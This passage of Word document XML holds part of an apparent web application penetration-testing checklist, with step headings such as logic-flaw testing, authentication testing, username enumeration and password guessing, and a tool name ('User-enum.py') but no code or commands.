          <w:p w14:paraId="20030DB3" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="30315768" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Silverlight objects</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6FF30047" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="585E9948" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="5933E60F" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1559" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="54226CB9" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="002027D4" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="47B1DA96" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test For Logic Flaws</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="0D1B7D1E" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="729BAC74" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="2FE00693" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="107" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1452" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="370DBA79" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="002027D4" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidR="00F33EAA">
              <w:t>.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="24B77273" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Identify Key attack Surface</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2CAE6BFD" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3A7183F4" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="28976D84" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="40691490" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1A46A604" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Incomplete Input</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="235BA8CB" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0E673636" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="58974BDA" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="545127C2" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="486F3044" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Transaction Logic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6C9B8508" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="254B6610" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="6"/>
    </w:tbl>
    <w:p w14:paraId="3F45D472" w14:textId="77777777" w:rsidR="003D55C7" w:rsidRDefault="003D55C7" w:rsidP="00CD4824">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74F3E29E" w14:textId="77777777" w:rsidR="003D55C7" w:rsidRPr="00ED3CCF" w:rsidRDefault="00521AB9" w:rsidP="00ED3CCF">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED3CCF">
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Access Handling</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="9497" w:type="dxa"/>
        <w:tblInd w:w="250" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="100"/>
        <w:gridCol w:w="101"/>
        <w:gridCol w:w="1560"/>
        <w:gridCol w:w="3200"/>
        <w:gridCol w:w="3402"/>
        <w:gridCol w:w="1134"/>
      </w:tblGrid>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="5857DEF3" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1761" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="4B49B2FF" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Number</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="6564B42E" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="636136DB" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="238249D9" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="4BA99422" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1761" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="3E10F74E" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="2BEC3BCF" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Test Authentication</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="20BF5130" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="669A61DF" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="02490900" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="43A4BA50" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>4.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="218C605D" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Understand the Mechanism</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="21598656" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="02834DB7" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="0F6E8622" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="46EAFC39" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>4.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3FDB0286" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Data attacks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="4FFCAF7D" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00690DD1" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>User-enum.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2BE51BF6" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="35DCDD2A" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1E1C910F" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="48F5A399" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test Password Quality</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1291F270" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="040E5B9A" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="73E7B675" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="751D7344" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="05DBDDD6" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test for Username Enumeration</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="5ED9FE08" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="009166DD" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>User-enum.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6BF367F3" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="34E9E02F" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1B4F96F9" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="575F9AA8" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test for Password Guessing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="09BD14D2" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="35D48472" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="7B945D2A" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
